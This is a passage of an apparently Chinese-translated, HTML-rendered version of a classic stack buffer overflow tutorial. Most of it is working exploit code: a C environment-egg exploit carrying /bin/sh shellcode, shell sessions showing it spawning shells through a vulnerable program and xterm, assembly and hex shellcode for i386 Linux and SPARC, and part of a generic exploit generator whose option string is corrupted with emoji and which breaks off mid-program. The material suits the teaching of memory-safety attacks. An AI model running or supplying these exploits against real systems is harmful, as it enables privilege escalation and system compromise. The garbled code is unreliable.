+</span><span class=c1></span><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt; </span><span class=cp>
+</span><span class=cp></span>
+<span class=cp>#define DEFAULT_OFFSET			0
+</span><span class=cp>#define DEFAULT_BUFFER_SIZE		512 
+</span><span class=cp>#define DEFAULT_EGG_SIZE		2048
+</span><span class=cp>#define NOP						0x90
+</span><span class=cp></span>
+<span class=kt>char</span> <span class=n>shellcode</span><span class=p>[]</span> <span class=o>=</span> <span class=s>&#34;</span><span class=se>\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b</span><span class=s>&#34;</span> <span class=s>&#34;</span><span class=se>\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd</span><span class=s>&#34;</span> <span class=s>&#34;</span><span class=se>\x80\xe8\xdc\xff\xff\xff</span><span class=s>/bin/sh&#34;</span><span class=p>;</span>
+
+<span class=kt>unsigned</span> <span class=kt>long</span> <span class=nf>get_esp</span><span class=p>(</span><span class=kt>void</span><span class=p>){</span>
+    <span class=n>__asm__</span><span class=p>(</span><span class=s>&#34;movl %esp,%eax&#34;</span><span class=p>);</span>
+<span class=p>}</span>
+
+<span class=kt>void</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[]){</span>
+    <span class=kt>char</span> <span class=o>*</span><span class=n>buff</span><span class=p>,</span> <span class=o>*</span><span class=n>ptr</span><span class=p>,</span> <span class=o>*</span><span class=n>egg</span><span class=p>;</span>
+    <span class=kt>long</span> <span class=o>*</span><span class=n>addr_ptr</span><span class=p>,</span> <span class=n>addr</span><span class=p>;</span>
+    <span class=kt>int</span> <span class=n>offset</span><span class=o>=</span><span class=n>DEFAULT_OFFSET</span><span class=p>,</span> <span class=n>bsize</span><span class=o>=</span><span class=n>DEFAULT_BUFFER_SIZE</span><span class=p>;</span>
+    <span class=kt>int</span> <span class=n>i</span><span class=p>,</span> <span class=n>eggsize</span><span class=o>=</span><span class=n>DEFAULT_EGG_SIZE</span><span class=p>;</span>
+    
+    <span class=k>if</span> <span class=p>(</span><span class=n>argc</span> <span class=o>&gt;</span> <span class=mi>1</span><span class=p>)</span> <span class=n>bsize</span> <span class=o>=</span> <span class=n>atoi</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
+    <span class=k>if</span> <span class=p>(</span><span class=n>argc</span> <span class=o>&gt;</span> <span class=mi>2</span><span class=p>)</span> <span class=n>offset</span> <span class=o>=</span> <span class=n>atoi</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>]);</span>
+    <span class=k>if</span> <span class=p>(</span><span class=n>argc</span> <span class=o>&gt;</span> <span class=mi>3</span><span class=p>)</span> <span class=n>eggsize</span> <span class=o>=</span> <span class=n>atoi</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>3</span><span class=p>]);</span>
+    
+    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=p>(</span><span class=n>buff</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=n>bsize</span><span class=p>)))</span> <span class=p>{</span> 
+        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Can&#39;t allocate memory.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span> 
+        <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+    <span class=p>}</span> 
+    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=p>(</span><span class=n>egg</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=n>eggsize</span><span class=p>)))</span> <span class=p>{</span>
+        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Can&#39;t allocate memory.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+        <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+    <span class=p>}</span>
+    
+	<span class=n>addr</span> <span class=o>=</span> <span class=n>get_esp</span><span class=p>()</span> <span class=o>-</span> <span class=n>offset</span><span class=p>;</span>
+    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Using address: 0x%x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>addr</span><span class=p>);</span>
+    
+	<span class=n>ptr</span> <span class=o>=</span> <span class=n>buff</span><span class=p>;</span>
+    <span class=n>addr_ptr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>long</span> <span class=o>*</span><span class=p>)</span> <span class=n>ptr</span><span class=p>;</span>
+    <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>bsize</span><span class=p>;</span> <span class=n>i</span><span class=o>+=</span><span class=mi>4</span><span class=p>)</span>
+        <span class=o>*</span><span class=p>(</span><span class=n>addr_ptr</span><span class=o>++</span><span class=p>)</span> <span class=o>=</span> <span class=n>addr</span><span class=p>;</span>
+    
+	<span class=n>ptr</span> <span class=o>=</span> <span class=n>egg</span><span class=p>;</span>
+	<span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>eggsize</span> <span class=o>-</span> <span class=n>strlen</span><span class=p>(</span><span class=n>shellcode</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
+        <span class=o>*</span><span class=p>(</span><span class=n>ptr</span><span class=o>++</span><span class=p>)</span> <span class=o>=</span> <span class=n>NOP</span><span class=p>;</span>
+    
+	<span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>strlen</span><span class=p>(</span><span class=n>shellcode</span><span class=p>);</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
+        <span class=o>*</span><span class=p>(</span><span class=n>ptr</span><span class=o>++</span><span class=p>)</span> <span class=o>=</span> <span class=n>shellcode</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
+    
+    <span class=n>buff</span><span class=p>[</span><span class=n>bsize</span> <span class=o>-</span> <span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=sc>&#39;\0&#39;</span><span class=p>;</span>
+    <span class=n>egg</span><span class=p>[</span><span class=n>eggsize</span> <span class=o>-</span> <span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=sc>&#39;\0&#39;</span><span class=p>;</span>
+    
+    <span class=n>memcpy</span><span class=p>(</span><span class=n>egg</span><span class=p>,</span><span class=s>&#34;EGG=&#34;</span><span class=p>,</span><span class=mi>4</span><span class=p>);</span>
+    <span class=n>putenv</span><span class=p>(</span><span class=n>egg</span><span class=p>);</span>
+    <span class=n>memcpy</span><span class=p>(</span><span class=n>buff</span><span class=p>,</span><span class=s>&#34;RET=&#34;</span><span class=p>,</span><span class=mi>4</span><span class=p>);</span>
+    <span class=n>putenv</span><span class=p>(</span><span class=n>buff</span><span class=p>);</span>
+    <span class=n>system</span><span class=p>(</span><span class=s>&#34;/bin/bash&#34;</span><span class=p>);</span>
+<span class=p>}</span>
+</code></pre></td></tr></table></div></div></div><p>让我们尝试我们新的exp怎么样</p><div class=highlight><div class=chroma><div class=table-container><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-sh data-lang=sh><span class=o>[</span>aleph1<span class=o>]</span>$ ./exploit4 <span class=m>768</span> 
+Using address: 0xbffffdb0 
+<span class=o>[</span>aleph1<span class=o>]</span>$ ./vulnerable <span class=nv>$RET</span> 
+$
+</code></pre></td></tr></table></div></div></div><p>这运行起来非常有魅力，让我在xterm上试试</p><div class=highlight><div class=chroma><div class=table-container><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-sh data-lang=sh><span class=o>[</span>aleph1<span class=o>]</span>$ <span class=nb>export</span> <span class=nv>DISPLAY</span><span class=o>=</span>:0.0 
+<span class=o>[</span>aleph1<span class=o>]</span>$ ./exploit4 <span class=m>2148</span> 
+Using address: 0xbffffdb0 
+<span class=o>[</span>aleph1<span class=o>]</span>$ /usr/X11R6/bin/xterm -fg <span class=nv>$RET</span> 
+Warning: Color name
+...°¤ÿ¿°¤ÿ¿°¤ ...
+Warning: some arguments in previous message were lost 
+$
+</code></pre></td></tr></table></div></div></div><p>第一次尝试就成功了！这无疑增加了我们的机会。根据漏洞利用程序与要尝试利用的程序比较的环境数据量，猜测的地址可能太低或太高。我们需要用正负偏移量进行实验。</p><h3 id=finding-buffer-overflows><a href=#finding-buffer-overflows class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>Finding Buffer Overflows</h3><p>如上所述，缓冲区溢出是由于将更多的信息填充到缓冲区中而无法容纳的结果。由于C没有任何内置的边界检查，所以溢出通常表现为在字符数组末尾写入。C的标准库提供了许多用于复制或拼接字符串的函数，这些函数都不执行边界检查。它们包括：<code>strcat()</code>，<code>strcpy()</code>，<code>sprintf()</code>和<code>vsprintf()</code>。这些函数对以<code>\0</code>结尾的字符串起作用，并且不检查接收字符串是否溢出。<code>gets()</code>是一个函数，将从stdin的一行读取到缓冲区中，直到终止换行符或EOF。它不检查缓冲区溢出。如果您要匹配一系列非空格字符（<code>％s</code>），则<code>scanf()</code>系列函数也可能会出现问题，或匹配指定集合（<code>％[]</code>）中的非空字符序列，以及char指针指向的数组不足以容纳整个字符序列，并且尚未定义可选的最大字段宽度。如果这些函数中的任何一个的目标都是静态大小的缓冲区，并且其另一个参数是通过某种方式从用户输入派生的，则很可能利用缓冲区溢出来攻击。我们发现的另一种常见的编程构造是使用 while循环，一次将一个字符从stdin或某个文件读入缓冲区，直到到达行尾，文件末尾或其他定界符。这种类型的构造通常使用以下函数之一：<code>getc()</code>，<code>fgetc()</code>或<code>getchar()</code>。如果在while循环中没有显式检查是否有溢出，则很容易利用这些程序。最 后，grep（1）是你的朋友。开源操作系统及其开源程序的源码很容易获得。一旦您意识到许多商业操作系统工具与开源程序有相同的源码，这一切就变得非常有趣。Use the source d00d。</p><hr><h4 id=附录ashellcode-for-different-operating-systemsarchitectures><a href=#附录ashellcode-for-different-operating-systemsarchitectures class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>附录A：Shellcode for Different Operating Systems/Architectures</h4><p>i386/Linux (32bi)</p><pre><code class=language-assembly data-lang=assembly>jmp		0x1f
+popl 	%esi 
+movl 	%esi,0x8(%esi) 
+xorl 	%eax,%eax 
+movb 	%eax,0x7(%esi) 
+movl 	%eax,0xc(%esi) 
+movb 	$0xb,%al 
+movl 	%esi,%ebx l
+eal 	0x8(%esi),%ecx 
+leal 	0xc(%esi),%edx 
+int		$0x80
+xorl 	%ebx,%ebx 
+movl 	%ebx,%eax 
+inc		%eax
+int		$0x80
+call 	-0x24 
+.string \&quot;/bin/sh\&quot;
+</code></pre><p>SPARC/Solaris</p><pre><code class=language-assembly data-lang=assembly>sethi 	0xbd89a, %l6 
+or		%l6, 0x16e, %l6
+sethi 	0xbdcda, %l7 
+and		%sp, %sp, %o0
+add		%sp, 8, %o1
+xor		%o2, %o2, %o2
+add		%sp, 16, %sp
+std		%l6, [%sp - 16]
+st		%sp, [%sp - 8]
+st		%g0, [%sp - 4]
+mov		0x3b, %g1
+ta		8
+xor		%o7, %o7, %o0
+mov		1, %g1
+ta		8
+</code></pre><p>SPARC/SunOS</p><pre><code class=language-assembly data-lang=assembly>sethi 	0xbd89a, %l6 
+or%l6, 	0x16e, %l6
+sethi 	0xbdcda, %l7 
+and		%sp, %sp, %o0
+add		%sp, 8, %o1
+xor		%o2, %o2, %o2
+add		%sp, 16, %sp
+std		%l6, [%sp - 16]
+st		%sp, [%sp - 8]
+st		%g0, [%sp - 4]
+mov		0x3b, %g1
+mov		-0x1, %l5
+ta		%l5 + 1
+xor		%o7, %o7, %o0
+mov		1, %g1
+ta		%l5 + 1
+</code></pre><h4 id=附录bgeneric-buffer-overflow-program><a href=#附录bgeneric-buffer-overflow-program class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>附录B：Generic Buffer Overflow Program</h4><div class=highlight><div class=chroma><div class=table-container><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-c data-lang=c><span class=c1>//shellcode.h
+</span><span class=c1></span>
+<span class=cp>#if defined(__i386__) &amp;&amp; defined(__linux__)
+</span><span class=cp></span>
+<span class=cp>#define NOP_SIZE		1
+</span><span class=cp></span><span class=kt>char</span> <span class=n>nop</span><span class=p>[]</span> <span class=o>=</span> <span class=s>&#34;</span><span class=se>\x90</span><span class=s>&#34;</span><span class=p>;</span>
+<span class=kt>char</span> <span class=n>shellcode</span><span class=p>[]</span> <span class=o>=</span> <span class=s>&#34;</span><span class=se>\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b</span><span class=s>&#34;</span> <span class=s>&#34;</span><span class=se>\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd</span><span class=s>&#34;</span> <span class=s>&#34;</span><span class=se>\x80\xe8\xdc\xff\xff\xff</span><span class=s>/bin/sh&#34;</span><span class=p>;</span>
+<span class=kt>unsigned</span> <span class=kt>long</span> <span class=nf>get_sp</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span> <span class=p>{</span> 
+    <span class=n>__asm__</span><span class=p>(</span><span class=s>&#34;movl %esp,%eax&#34;</span><span class=p>);</span>
+<span class=p>}</span>
+
+<span class=cp>#elif defined(__sparc__) &amp;&amp; defined(__sun__) &amp;&amp; defined(__svr4__)
+</span><span class=cp></span>
+<span class=cp>#define NOP_SIZE		4
+</span><span class=cp></span><span class=kt>char</span> <span class=n>nop</span><span class=p>[]</span><span class=o>=</span><span class=s>&#34;</span><span class=se>\xac\x15\xa1\x6e</span><span class=s>&#34;</span><span class=p>;</span>
+<span class=kt>char</span> <span class=n>shellcode</span><span class=p>[]</span> <span class=o>=</span> <span class=s>&#34;</span><span class=se>\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e</span><span class=s>&#34;</span> <span class=s>&#34;</span><span class=se>\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0</span><span class=s>&#34;</span> <span class=s>&#34;</span><span class=se>\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\x91\xd0\x20\x08</span><span class=s>&#34;</span> <span class=s>&#34;</span><span class=se>\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd0\x20\x08</span><span class=s>&#34;</span><span class=p>;</span>
+<span class=kt>unsigned</span> <span class=kt>long</span> <span class=nf>get_sp</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span> <span class=p>{</span> 
+    <span class=n>__asm__</span><span class=p>(</span><span class=s>&#34;or %sp, %sp, %i0&#34;</span><span class=p>);</span>
+<span class=p>}</span>
+
+<span class=cp>#elif defined(__sparc__) &amp;&amp; defined(__sun__) 
+</span><span class=cp></span>
+<span class=cp>#define NOP_SIZE
+</span><span class=cp></span><span class=mi>4</span> <span class=kt>char</span> <span class=n>nop</span><span class=p>[]</span><span class=o>=</span><span class=s>&#34;</span><span class=se>\xac\x15\xa1\x6e</span><span class=s>&#34;</span><span class=p>;</span>
+<span class=kt>char</span> <span class=n>shellcode</span><span class=p>[]</span> <span class=o>=</span> <span class=s>&#34;</span><span class=se>\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e</span><span class=s>&#34;</span> <span class=s>&#34;</span><span class=se>\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0</span><span class=s>&#34;</span> <span class=s>&#34;</span><span class=se>\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\xaa\x10\x3f\xff</span><span class=s>&#34;</span> <span class=s>&#34;</span><span class=se>\x91\xd5\x60\x01\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd5\x60\x01</span><span class=s>&#34;</span><span class=p>;</span>
+
+<span class=kt>unsigned</span> <span class=kt>long</span> <span class=nf>get_sp</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span> <span class=p>{</span> 
+    <span class=n>__asm__</span><span class=p>(</span><span class=s>&#34;or %sp, %sp, %i0&#34;</span><span class=p>);</span>
+<span class=p>}</span> 
+
+<span class=cp>#endif
+</span><span class=cp></span>
+</code></pre></td></tr></table></div></div></div><div class=highlight><div class=chroma><div class=table-container><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-c data-lang=c><span class=c1>//eggshell.c
+</span><span class=c1></span><span class=cp>#include</span> <span class=cpf>&#34;stdio.h&#34;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&#34;shellcode.h&#34; </span><span class=cp>
+</span><span class=cp>#define DEFAULT_OFFSET			0 
+</span><span class=cp>#define DEFAULT_BUFFER_SIZE 	512 
+</span><span class=cp>#define DEFAULT_EGG_SIZE		2048
+</span><span class=cp></span><span class=kt>void</span> <span class=nf>usage</span><span class=p>(</span><span class=kt>void</span><span class=p>);</span>
+
+<span class=kt>void</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[])</span> <span class=p>{</span> 
+    <span class=kt>char</span> <span class=o>*</span><span class=n>ptr</span><span class=p>,</span> <span class=o>*</span><span class=n>bof</span><span class=p>,</span> <span class=o>*</span><span class=n>egg</span><span class=p>;</span>
+    <span class=kt>long</span> <span class=o>*</span><span class=n>addr_ptr</span><span class=p>,</span> <span class=n>addr</span><span class=p>;</span>
+    <span class=kt>int</span> <span class=n>offset</span><span class=o>=</span><span class=n>DEFAULT_OFFSET</span><span class=p>,</span> <span class=n>bsize</span><span class=o>=</span><span class=n>DEFAULT_BUFFER_SIZE</span><span class=p>;</span>
+    <span class=kt>int</span> <span class=n>i</span><span class=p>,</span> <span class=n>n</span><span class=p>,</span> <span class=n>m</span><span class=p>,</span> <span class=n>c</span><span class=p>,</span> <span class=n>align</span><span class=o>=</span><span class=mi>0</span><span class=p>,</span> <span class=n>eggsize</span><span class=o>=</span><span class=n>DEFAULT_EGG_SIZE</span><span class=p>;</span>
+    
+    <span class=k>while</span> <span class=p>((</span><span class=n>c</span> <span class=o>=</span> <span class=n>getopt</span><span class=p>(</span><span class=n>argc</span><span class=p>,</span> <span class=n>argv</span><span class=p>,</span> <span class=s>&#34;a🅱️e⭕&#34;</span><span class=p>))</span> <span class=o>!=</span> <span class=n>EOF</span><span class=p>)</span> 
+        <span class=k>switch</span> <span class=p>(</span><span class=n>c</span><span class=p>)</span> <span class=p>{</span> 
+            <span class=k>case</span> <span class=sc>&#39;a&#39;</span><span class=o>:</span> 
+                <span class=n>align</span> <span class=o>=</span> <span class=n>atoi</span><span class=p>(</span><span class=n>optarg</span><span class=p>);</span>
+                <span class=k>break</span><span class=p>;</span>
+			<span class=k>case</span> <span class=sc>&#39;b&#39;</span><span class=o>:</span> 
+                <span class=n>bsize</span> <span class=o>=</span> <span class=n>atoi</span><span class=p>(</span><span class=n>optarg</span><span class=p>);</span>
+                <span class=k>break</span><span class=p>;</span>
+			<span class=k>case</span> <span class=sc>&#39;e&#39;</span><span class=o>:</span> 
+                <span class=n>eggsize</span> <span class=o>=</span> <span class=n>atoi</span><span class=p>(</span><span class=n>optarg</span><span class=p>);</span> 
+                <span class=k>break</span><span class=p>;</span>
+            <span class=k>case</span> <span class=sc>&#39;o&#39;</span><span class=o>:</span> 
+                <span class=n>offset</span> <span class=o>=</span> <span class=n>atoi</span><span class=p>(</span><span class=n>optarg</span><span class=p>);</span> 
+                <span class=k>break</span><span class=p>;</span>
+            <span class=k>case</span> <span class=sc>&#39;?&#39;</span><span class=o>:</span> 
+                <span class=n>usage</span><span class=p>();</span> 
+                <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+        <span class=p>}</span>
+    <span class=k>if</span> <span class=p>(</span><span class=n>strlen</span><span class=p>(</span><span class=n>shellcode</span><span class=p>)</span> <span class=o>&gt;</span> <span class=n>eggsize</span><span class=p>)</span> <span class=p>{</span>
+        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Shellcode is larger the the egg.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+        <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+    <span class=p>}</span>
+    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=p>(</span><span class=n>bof</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=n>bsize</span><span class=p>)))</span> <span class=p>{</span>
+        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Can&#39;t allocate memory.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+        <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+    <span class=p>}</span>
+    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=p>(</span><span class=n>egg</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=n>eggsize</span><span class=p>)))</span> <span class=p>{</span>
